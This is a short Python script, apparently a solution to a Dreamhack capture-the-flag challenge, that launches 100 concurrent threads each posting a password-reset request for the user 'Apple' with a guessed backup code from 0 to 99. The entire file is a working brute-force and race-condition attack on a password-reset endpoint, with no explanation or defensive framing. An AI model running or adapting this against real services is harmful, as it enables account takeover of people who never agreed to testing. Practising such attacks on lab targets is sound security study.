from inspect import Parameter
from re import I
import threading
import requests

URL = 'http://host3.dreamhack.games:18063/forgot_password'

for BACKUPCODE in range(100):
    parameter = {'userid' : 'Apple', 'newpassword' : 'nabomhalang', 'backupCode': BACKUPCODE}
    th = threading.Thread(target=requests.post, args=(URL, parameter))
    th.start()
    